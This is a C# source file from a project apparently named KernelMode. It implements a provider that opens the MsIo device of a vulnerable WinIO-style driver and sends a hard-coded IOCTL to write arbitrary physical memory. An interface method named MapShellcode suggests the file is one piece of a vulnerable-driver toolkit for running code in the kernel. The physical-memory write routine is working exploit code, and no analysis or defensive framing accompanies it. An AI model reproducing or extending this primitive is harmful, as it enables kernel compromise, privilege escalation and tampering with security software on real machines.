// File: Providers/MsioProvider.cs
// Project: KernelMode

using System;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using KernelMode.Providers;
using KernelMode.Utils;

namespace KernelMode.Providers
{
	public class MsioProvider : IProvider
	{
		private const string DeviceName = "\\\\.\\MsIo";
		private const uint IOCTL_WRITE_PHYS = 0x9C402088; // typical for WinIO-style drivers
		private SafeFileHandle _handle;
		public bool IsInitialized { get; private set; }

		[StructLayout(LayoutKind.Sequential)]
		private struct PhysWriteStruct
		{
			public ulong Address;
			public uint Size;
			public ulong Buffer;
		}

		public bool Initialize()
		{
			_handle = NativeMethods.CreateFile(DeviceName,
				NativeMethods.GENERIC_READ | NativeMethods.GENERIC_WRITE,
				0, IntPtr.Zero, NativeMethods.OPEN_EXISTING,
				0, IntPtr.Zero);

			IsInitialized = !_handle.IsInvalid && !_handle.IsClosed;
			return IsInitialized;
		}

		public bool ReadMemory(ulong address, byte[] buffer, int size)
		{
			Console.WriteLine("[-] MsIo does not support memory read directly.");
			return false;
		}

		public bool WriteMemory(ulong address, byte[] buffer, int size)
		{
			if (!IsInitialized) return false;

			IntPtr tmpBuf = Marshal.AllocHGlobal(size);
			Marshal.Copy(buffer, 0, tmpBuf, size);

			IntPtr reqPtr = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(PhysWriteStruct)));

			var req = new PhysWriteStruct
			{
				Address = address,
				Size = (uint)size,
				Buffer = (ulong)tmpBuf.ToInt64()
			};

			Marshal.StructureToPtr(req, reqPtr, false);

			int bytesReturned;
			bool result = NativeMethods.DeviceIoControl(
				_handle,
				IOCTL_WRITE_PHYS,
				reqPtr,
				Marshal.SizeOf(typeof(PhysWriteStruct)),
				IntPtr.Zero,
				0,
				out bytesReturned,
				IntPtr.Zero);

			Marshal.FreeHGlobal(tmpBuf);
			Marshal.FreeHGlobal(reqPtr);
			return result;
		}


		public bool MapShellcode(byte[] shellcode, ulong param)
		{
			Console.WriteLine("[-] MsIo does not support shellcode mapping directly.");
			return false;
		}

		public void Dispose()
		{
			_handle?.Dispose();
		}
	}
}
